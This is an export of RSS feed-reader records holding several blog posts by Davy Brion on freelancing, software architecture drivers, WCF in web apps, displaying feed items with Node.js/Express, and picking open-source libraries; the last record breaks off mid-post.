{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/kthPy9_wMg0/","title":"Looking Back On 2011","published":{"$wrap":"$date","v":1324928589000,"h":"2011-12-26T19:43:09.000Z"},"starred":false,"read":false,"content":"<p>This was my first year working as an independent, and it's been quite a year. Things have gone very well, and I'm amazed at how quickly it all went by. This time last year, I was looking forward to start working for my first client though I didn't quite know what to expect. I hoped it would be interesting, and it certainly has been. I've been able to work with interesting technologies, with the kind of technical variety that I've come to really enjoy. I wrote more code in JavaScript than in C# this year, and I've also been able to do quite a bit of Ruby as well. I certainly didn't expect that going into this contract, so that was a major bonus. Even better than the technologies I've been able to work with this year are the people I've worked with. The team I've worked with has a fantastic mix of experience, knowledge and talent and it feels like all of us continuously learn new things from each other which is a situation I can only recommend to every developer.</p><p>Another great part about being independent is that you're free to do extra things on the side as well. I'm very happy with the responses that I've gotten from the people who've taken my <ahref=\"http://thatextramile.be/training/nhibernate\">NHibernate course</a>, and I'm going to continue to offer it in 2012. I initially thought it would be something I'd do once or twice, but I was able to do the course 4 times this year: 1 public and 3 private ones. I've got another private one scheduled in February and will organize another public course in 2012, though this time I'm taking care of the whole thing myself instead of working with another company to organize it.</p><p>The most important thing I've learned from this first year is that it's important not to try to do too much. The first 6 months of 2011 were way too busy and hectic, and I only spent one full day doing absolutely nothing work-related. I've been taking things much slower since July and I'm spending much more time enjoying other things in life outside of work. For 2012, my biggest priority is pacing myself much better and spreading things out more. I always seem to alternate between months where I'm always working on something, followed by months of doing as little as possible outside of the 40 hours a week I do for my client. Hopefully, I can finally find a maintainable balance between those two extremes in 2012 <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>On the blogging front, 2011 was a different year than the previous ones on this blog. In the previous years, I averaged about 150 posts a year but this year I only published 71 posts. And I'm actually happy about that. In fact, I hope to get that number down to 50 next year. I still like writing posts, but I no longer feel the need to like I did in the past while I was trying to build a bit of an audience. That often meant pushing myself to keep publishing new posts. Nowadays, I'll only write a post if I really feel like it, which in the long run is much more sustainable anyway. As far as topics covered this year, things have changed quite a bit as well. Some of my views, opinions and technical preferences have changed this year, which naturally reflects in the content I've published. I'm sure I've lost some readers this year because of it, but I also seem to have gained a lot more readers than I've lost. I don't know yet what I'll be writing about in 2012, but I will continue to push people to learn new things (or old things that people seem to forget about) and do better like I always have on this blog, in my own unique way of course <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I hope you all enjoyed Christmas, and I wish you all a happy 2012. If it does turn out to be our last year on this planet, we might as well make it count.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/kthPy9_wMg0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1102}}
{"k":"0000000084","o":"0000010617","v":"001"}
{"_id":1103,"_uid":1103,"_dt":1373742620873,"_s":"c584ab8fb04e6b13b6b11ff38a4c370d"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/yuIOGHkNr8w/","title":"Architectural Drivers","published":{"$wrap":"$date","v":1330276250000,"h":"2012-02-26T17:10:50.000Z"},"starred":false,"read":false,"content":"<p>There are many different opinions and preferences when it comes to how we should deal with software architecture. My personal preference is to try not to make things more complex than they should be, while striving to maintain enough flexibility to be able to deal with future changes in both functional and non-functional requirements in a way that hopefully doesn't require extensive effort. I've always thought of good architecture essentially being something that enables developers to keep implementing new features over time at a similar cost than what it took to implement features in the early stages of development. Thus I prefer to try to find a balance between simplicity of the codebase, and making sure that the architecture scales nicely (from a code quality point of view) as the application grows in functionality. I also like to make sure that we can scale out (from a performance/throughput point of view) relatively easily if that need to scale comes up. These are just my general preferences though, and aren't always relevant to every project or suitable for every situation. I'm now in the 10th year of my career and have seen a variety of architectural styles in the wild, and of course I've read and heard about many more since the subject has always interested me a lot. I've learned that it's important to keep <em>architectural drivers</em> of a project in mind when thinking about what kind of architecture is suitable for a certain project or situation. Those drivers are often more important than whatever your personal preferences are. I've come up with a list of drivers that I think should influence the architecture used by teams or organizations.</p><h3>Simplicity/Complexity of the application</h3><p>A common mistake is to decide to use a fashionable architectural style in a project that doesn't really have enough complexity to warrant the use of said architectural style. For instance, there's no reason whatsoever to go the DDD route if your application is mostly a forms-over-data CRUD app. You won't really get any benefit from it, and you'll only increase the total cost of the required development effort. On the other hand, an application which will feature a lot of <em>behavior</em> in a complex domain will certainly benefit from using a DDD approach versus a data-driven approach that implements the behavior in a more procedural, transaction-script based approach. Be honest to your customer/employer and <em>yourself</em> and make an objective decision based on the simplicity or the complexity of the required solution that you're being paid to build. Don't let enthusiasm for a fashionable architectural style influence your decision.</p><h3>Expected lifetime of the application</h3><p>Some applications live for years and years, and some are only temporary solutions that will be phased out a year or two after having been put in production. Of course, some of those temporary solutions end up being used much longer than what was originally expected due to a variety of reasons but that certainly isn't always a given. Unless you're familiar enough with how things typically go at your client or your company to predict these things, your best bet is to just go with the initially expected lifetime of the application. Does a temporary solution require the best possible architecture out there, and the resulting impact that would have on the cost to build it? I'd say it most often doesn't. In these cases, there's nothing wrong with going for the approach that is simply good enough for what is required. Striving for perfection is expensive, and generally not worth it for short-term solutions. Conversely, if the solution is expected to last a long time, a solid architecture becomes more important and is worth the extra investment to (try to) get it right if that makes it possible to keep the costs of long-term development under control.</p><h3>Strategic importance of the application</h3><p>Some applications are meant to improve the <em>core business</em> of a company, while others play a more supportive role in something that isn't actually part of the company's core business. Some applications generate revenue (directly or by improving efficiency of revenue-generating activities) while others are meant to reduce costs, typically administrative in nature. Cost reduction is important, but it's not quite as important as revenue generation and that's a factor that should be taken under consideration. A strategically important application almost always warrants putting in the effort to come up with a good architecture because it's highly likely that the application will have to evolve in whichever direction the business evolves. That's not to say that the same kind of effort wouldn't be important for cost-reducing applications. But it just might be less important than you'd like to think it is. Again, good architecture increases the cost of the project, and the return on that investment in the big picture of the company should not be ignored.</p><h3>Skill-level/discipline of team</h3><p>Good code and good architecture requires skill and discipline. A strong team is capable of letting good architecture grow organically and keep it at a high quality level. For a mediocre team, letting it grow organically is too often a recipe for disaster. Ideally, we'd always be working with strong teams but as we all know, that simply isn't always possible. For mediocre teams, it often makes sense to put architecture in place that is more restrictive in nature and where everyone knows how the code should be structured in advance. The downside is that this typically reduces flexibility and individual creativity, and often introduces more ceremony and indirection than what many of us would ideally like to see. But it's likely that those downsides are offset by having everyone on the same page and taking some possibly difficult decisions away from people who might not be strong enough to make the right decisions. I know that sounds harsh, but that's a reality that many of us have to deal with.</p><h3>Conformity/Continuity</h3><p>A lot of IT departments or software development companies prefer to use the same architecture and frameworks/libraries for most (or even all) of their projects because it makes it easier to have people work on multiple projects. In this situation, it's easier to move people between projects or have them do maintenance work on a project they weren't initially involved in. While this often prevents going with the most suitable approach for every project, it does introduce a few benefits that are hard to argue with. People will need less time to get familiar with a code base. In-house training and sharing of knowledge get easier. Bringing in new people (especially for temporary assignments) also gets somewhat easier because you have a baseline of required skills/knowledge that should go a long way within the organization. A huge downside however, is that it creates an environment that will quickly frustrate creative developers. Also, when new strong developers are brought in, they could quickly tune out once they realize they got there too 'late' to have any influence on how projects are developed. The interesting part about this driver is that it is influenced by the skill-level-discipline driver, while simultaneously influencing it towards the future.</p><h3>Non-functional requirements</h3><p>This is the last driver on the list, but it is certainly not the least important. Obviously, architecture is greatly influenced by some important non-functional requirements. There are many factors that can have a profound influence on what the most suitable architecture of a system could be, and it's important to think about those as quickly as possible. Do you need to respond in real time? Do you need to support mobile devices? Will there be connectivity issues? Will you need to scale massively? What are the auditing requirements? Are you dependent on third-party services? Do you need to minimize resource consumption? What kind of accessibility do you have to keep into account? The list goes on and on and many of these issues can end up becoming huge problems if you don't think about them ahead of time. Of course, you can't think of everything in advance, and many non-functional requirements can be introduced during the lifetime of the application instead of being known in advance. But the more you know in advance, the better you can prepare your software for them from the beginning.</p><h3>Conclusion</h3><p>There is a virtually endless variety of architectural choices and styles that can influence how you develop software. And unfortunately, there's a lot of dogma surrounding it as well. I hope this post made it clear that there is no definitive 'right' or 'wrong' when it comes to architecture, and that (as pretty much everything else in this business) it all really depends <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I'm sure you can think of more architectural drivers, and I'd love to hear about any that you think I've forgotten.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/yuIOGHkNr8w\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1103}}
{"k":"0000000084","o":"0000006999","v":"001"}
{"_id":1104,"_uid":1104,"_dt":1373742620873,"_s":"31170d75d848d894003d0891e55f448e"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/p7TClTj7aaA/","title":"What’s The Point Of Using WCF In A Web App?","published":{"$wrap":"$date","v":1332088108000,"h":"2012-03-18T16:28:28.000Z"},"starred":false,"read":false,"content":"<p>A very common approach of building web applications in .NET is to put most of the non-UI related code behind an internal WCF service layer. I used to be a fan of this approach as well, but these days I just don't see the benefit of that internal service layer anymore. The overhead that an internal WCF service layer adds to development, deployment and runtime performance just doesn't stack up favorably to the supposed benefits IMO. To be clear: I'm talking about WCF services that will <em>only</em> be used by the front end of your web application.</p><p>Let's talk about the overhead on development first. If you're using WCF services in your web app, you need proxies to access those services. Some people prefer to generate the proxies based on the WSDL of the services that will be used. In the worst case, this leads to regenerating proxies and all of the types that are defined in the WSDL every time you change a service contract or one of the types that are used by the services. If multiple people need to make changes to any of these concurrently, this easily leads to merging problems when people need to commit their changes. Another way is to share the same types on both sides (client & server), and implement your service proxies by inheriting from ClientBase and manually keeping the implementation of the proxies up to date with the definitions of their service contracts. This is better than regenerating a bunch of code all the time, but you're still writing a lot of redirection code for the purpose of, well, what exactly? Another possibility is to use dynamic proxies which automatically implement the service contracts but this increases the amount of infrastructure code you need to put in place and it's not always clear to everyone how exactly communication with the services happens. There's also a lot of WCF configuration for each service that you need to maintain, and it can quickly grow unwieldy.</p><p>Then there's the overhead on performance. I hope we can all agree that any operation that goes out of process is at least an order of magnitude slower than a similar operation that can be executed in process. First of all, there's the networking overhead (even if your services are hosted on the same machine as the web app) that you have to keep into account. Secondly, there is the cost of serializing and deserializing <em>everything</em> that is transferred between the client and the server. Even with the most efficient bindings and serializers, the cost of all of this quickly adds up on high-traffic web apps. That's not to say that WCF services are inherently slow. They can be very fast and efficient, but they'll never be as fast and efficient as executing that logic in process within the web app.</p><p>Finally, there's the extra overhead it introduces to the deployment phase:</p><ul><li>more endpoints to set up and transfer artifacts to</li><li>more configuration</li><li>more monitoring of endpoints</li><li>more servers if you're not hosting the services and the web app on the same machine</li></ul><p>Of course, people will argue that there a plenty of benefits to using a WCF service layer in a web app. The ones I hear about most often are the forced separation of business logic and UI logic and improved scalability and reliability. I really disagree that you need a physical separation of business and UI logic. I much prefer approaches where the separation is based on abstractions. A good example was recently posted by Ayende (<ahref=\"http://ayende.com/blog/154241/limit-your-abstractions-the-key-is-in-the-infrastructurehellip\">here</a> and <ahref=\"http://ayende.com/blog/154273/limit-your-abstractions-and-how-do-you-handle-testing\">here</a>). And when it comes to scalability/reliability, a web app that isn't dependent on a WCF service layer is as easy (or even easier depending on your setup) to scale than one that is entirely dependent on WCF services. First of all, if you care about scalability/reliability your web app should already be prepared to run behind a load balancer. If you already have a load balancer in place, you can just add more web servers to your setup when needed. If you'd host the WCF services on the same machines that are hosting the web front end, you'd get less total throughput from one server than you would if that one server could just host a web app that fully executes in process (not including the database obviously). If you're hosting the WCF services on separate machines, you'd end up with more servers to handle the load and to achieve the reliability you need than you would with just being able to add more web servers to your setup. That also increases your licensing costs. And of course, it also means increased networking overhead on every service call, which also implies that the threads on your web servers will be blocked for longer periods while they wait for those service calls to return. Unless you're calling those services asynchronously, but most people simply don't. Also, if you have serious scalability and reliability requirements you're probably better off with asynchronous messaging solutions than with SOAP services.</p><p>WCF has its benefits (though I prefer Web API's or asynchronous messaging over SOAP services these days) and it has its use cases. I just don't think internal service layers for web apps is one of them.</p><p>What are the benefits that you think an internal WCF service layer brings to your web app? And what's your opinion on how they stack up versus the downsides?</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/p7TClTj7aaA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1104}}
{"k":"0000000084","o":"0000003362","v":"001"}
{"_id":1105,"_uid":1105,"_dt":1373742620874,"_s":"2202330596a36da062c10af22ad7e255"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/Awt1njA8rQU/","title":"Challenge: Displaying Feed Items On A Web Page","published":{"$wrap":"$date","v":1324135061000,"h":"2011-12-17T15:17:41.000Z"},"starred":false,"read":false,"content":"<p>I'm finally getting around to implementing the website for my company, and there's one small part of it that's quite interesting from an implementation point of view. The website will have a footer on each page which displays links to my 5 most recent blog posts:</p><p><ahref=\"http://davybrion.com/blog/wp-content/uploads/2011/12/feed_items.png\" rel=\"prettyPhoto[3822]\"><imgsrc=\"http://davybrion.com/blog/wp-content/uploads/2011/12/feed_items.png\" alt=\"\" title=\"feed_items\" width=\"683\" height=\"402\" class=\"aligncenter size-full wp-image-3823\" /></a></p><p>Of course, I don't want to update those links manually whenever I publish a new post, so they need to be retrieved from my blog's RSS feed, which is published by Feedburner. I was hoping to be able to retrieve only the metadata from the posts (date, title and URL is all I need) because my feed always contains the last 20 posts and its total size is usually above 100KB. I haven't found a way to do that, so getting the information I need has to be retrieved through the full feed. Sure, 100KB isn't much but keep in mind that you need to retrieve it and parse it and that I absolutely want to minimize the time each request takes and that I'd rather not see any visual delays on the page either.</p><p>I'm interested in hearing how you would implement this. You have total freedom to pick the technologies you'd like to use and no limits on how you'd use them. My only requirements are these:</p><ul><li>It needs to be <strong>fast</strong></li><li>The fewer requests that are impacted by retrieving the feed data, the better</li><li>If I publish a post, the links on the company website should contain the new link within 30 minutes</li><li>The simpler the solution, the better</li></ul><p>My solution can be found <ahref=\"http://davybrion.com/blog/2011/12/displaying-feed-items-on-a-web-page-my-solution/\">here</a>.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/Awt1njA8rQU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1105}}
{"k":"0000000084","o":"0000007360","v":"001"}
{"_id":1106,"_uid":1106,"_dt":1373742620874,"_s":"f7b050f7f24a3691f47e7317a0616575"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/YOg6tZlA7JI/","title":"Displaying Feed Items On A Web Page: My Solution","published":{"$wrap":"$date","v":1324364455000,"h":"2011-12-20T07:00:55.000Z"},"starred":false,"read":false,"content":"<p>A couple of days ago I <ahref=\"http://davybrion.com/blog/2011/12/challenge-displaying-feed-items-on-a-web-page/\">asked you</a> how you'd implement showing links from an RSS feed on a web page (in this case: my new company web site). These are my requirements for this:</p><ul><li>It needs to be <strong>fast</strong></li><li>The fewer requests that are impacted by retrieving the feed data, the better</li><li>If I publish a post, the links on the company website should contain the new link within 30 minutes</li><li>The simpler the solution, the better</li></ul><p>I came up with a very simple solution, which satisfies these requirements better than any other solution I could think of, or heard of from other people. It is extremely fast, doesn't delay any requests, and doesn't require me to deploy anything but the company website. I'm building the site with <ahref=\"http://expressjs.com/\">Express</a> on <ahref=\"http://nodejs.org/\">Node.js</a>, which means I can take full advantage of the asynchronous nature of Node.js to implement this.</p><p>Let's go over the code... in the script that starts the express server, I have the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var express = require('express'),app = module.exports = express.createServer(),NodePie = require('nodepie'),request = require('request'),recentFeedItems = null;app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});// ... some extra configuration of Express that isn't relevant to this postvar processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>I'll discuss the code in just a moment, but first I want to show the view code that renders the links:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;ul&gt;&lt;% getRecentFeedItems.forEach(function(item) { %&gt;&lt;li&gt;&lt;time class=\"date\"&gt;&lt;%= item.getDate().getDate() + '/' + (item.getDate().getMonth() + 1) %&gt;&lt;/time&gt;&lt;a href=\"&lt;%= item.getPermalink() %&gt;\"&gt;&lt;%= item.getTitle() %&gt;&lt;/a&gt;&lt;/li&gt;&lt;% }); %&gt;&lt;/ul&gt;</pre></div><p>And that's all. This is the solution in its entirety!</p><p>If you're new to Node, this code probably requires some explanation. Let's start with this part:</p><div><pre class=\"brush: jscript; title: ; notranslate\">app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});</pre></div><p>Here I'm adding a dynamic helper to the Express application. It basically means that my views have access to the getRecentFeedItems function, which returns the value of the recentFeedItems variable. It's important to know that the getRecentFeedItems function creates a closure on the recentFeedItems variable created above it. That means that if the value of the recentFeedItems variable changes at any point in time, the getRecentFeedItems function will return that new value.</p><div><pre class=\"brush: jscript; title: ; notranslate\">var processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};</pre></div><p>This just creates a function that we can use later on. It retrieves the feed asynchronously, and when the result is retrieved, we parse the feed using the NodePie library and we get the 5 most recent items which we store in the recentFeedItems variable. Again, this creates a closure on the recentFeedItems variable which means that every time we assign a value to this variable, any subsequent call to the getRecentFeedItems function will return the value we just assigned to it because both functions point to the same memory thanks to the magic of closures. Finally, if a callback is provided as a parameter, the callback will be invoked.</p><div><pre class=\"brush: jscript; title: ; notranslate\">setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>The call to setInterval makes sure that the processFeed function is called every 30 minutes. After that, we call the processFeed function manually, and we pass in a callback where we start the Express server. This guarantees that the feed items will be in memory before the server starts processing requests.</p><p>What makes this solution so great is that we take full advantage of some of Node's benefits. Whenever we retrieve the RSS feed, Node.JS will retrieve that data asynchronously. As soon as it has fired the request to get the RSS feed, it just goes to the next event in its eventloop so no request is kept waiting while we wait for the data to be downloaded. Until the data from the RSS feed is returned, each request will just use the items that are stored in the recentFeedItems variable. Once the data has been returned, our callback is executed which overwrites the value of the recentFeedItems variable. We don't need to do any locking here because the Node.JS eventloop is single-threaded: while our callback is running, no other code that has access to the recentFeedItems variable can be executed anyway. And the actual parsing of the RSS feed is done by NodePie, which uses <ahref=\"http://expat.sourceforge.net/\">expat</a> behind the scenes, which is supposedly the fastest C XML parser available.</p><p>Looking back on my initial requirements, I think this solution matches very well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/YOg6tZlA7JI\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1106}}
{"k":"0000000084","o":"0000005870","v":"001"}
{"_id":1107,"_uid":1107,"_dt":1373742620874,"_s":"00c2028e51d5f179e89833cfaf18daad"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/4BpBYXj8pYY/","title":"How Do You Pick Open Source Libraries?","published":{"$wrap":"$date","v":1326748540000,"h":"2012-01-16T21:15:40.000Z"},"starred":false,"read":false,"content":"<p>I'm currently looking into which library I'm going to use to handle authentication in a breakable toy project. Now, despite it being just a breakable toy, I want to do it with as few constraints on technical quality as possible because I want to maximize the learning experience I'm going to get from it. That means I don't just want to quickly put something together that just works. I want something that works, but that would also hold up in real world scenarios, even though the project will at best only be used by myself. Which means that I'm going to be picky about any libraries that I take a dependency on, just as I would if this were a project that I'd be getting paid to work on.</p><p>So as I was browsing through a few possible alternatives for my authentication needs, I started thinking about my thought process when evaluating libraries/frameworks to use. I generally base my decision on the following items, listed in order of importance (to me):</p><ul><li><strong>How well does it work for my scenario?</strong> If a library satisfies all other items on this list, that certainly doesn't mean it's an automatic lock. How it works and the impact it has on my code is definitely the most important factor.</li><li><strong>Popularity</strong>. I've noticed that I let the number of watchers/forks on sites like Github influence my opinion. If a project has many watchers and many forks, odds are high that there's a relatively large group of happy users as well as people involved with the project. It also increases the odds that the project will be around for a while. Of course, inactive Open Source projects often remain available as well but if nobody's working on it, I'm not exactly tempted to take a dependency on it. Log4net is a notable exception to this, obviously. But when a project has a lot of people interested in it, or better yet, contributing to it, it's a good sign that you'll easily get help if needed, it's only going to get better in the long run and that it might get forked should the original developers stop working on it. As the author of an Open Source project that doesn't have a lot of watchers/forks (<ahref=\"https://github.com/davybrion/Agatha\">Agatha</a>), I'm aware that my point of view on this is rather hypocritical but hey, it is what it is.</li><li><strong>Code quality</strong>. I don't have the time to do an in-depth review of the code as I'm sure most of us don't do either. But I do like to glance over the code to get a general feel of the quality of the code. I focus mostly on the clarity of the code and also keep an eye open for sloppiness or downright WTF's. I guess the questions I'm mostly trying to answer when doing this are: \"is this code I'd like to try to improve or fix if I need to?\" and \"how easy would it be to debug this when I need to troubleshoot some non-obvious issues?\".</li><li><strong>Location of code and issue tracker</strong>. A lot of people will probably take issue with this, but I consider it to be a major plus if the project is on Github. Not just because of my personal preference of Github, but because they truly encourage people to collaborate and contribute to projects and they make it very easy to do so. Also, the site is fast! I cringe when I have to look over issues of projects on Codeplex because it's just terribly slow. And the UI doesn't come close to that of Github either. I've heard that Bitbucket is pretty similar to Github, but I've never even looked for projects there. In any case: I want to be able to download the <em>latest</em> version of the code at any time, or of a particular branch if I need to, as easily as possible. I also prefer an issue tracker which is fast, responsive and easy to search. It doesn't have to be Github, but those 2 requirements are important to me.</li><li><strong>License</strong>. If it's GPL, I don't use it. Also, I check whether or not a commercial license needs to be purchased when you want to use the library/framework in production. Pay attention to dual-licensed projects because that Open Source license might not apply to commercial/production use!</li></ul><p>I'd love to hear your thoughts on this. Did I miss any important factors? I just quickly put this post together so it's likely that I missed some good ones <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:D7DqB2pKExk\"><img 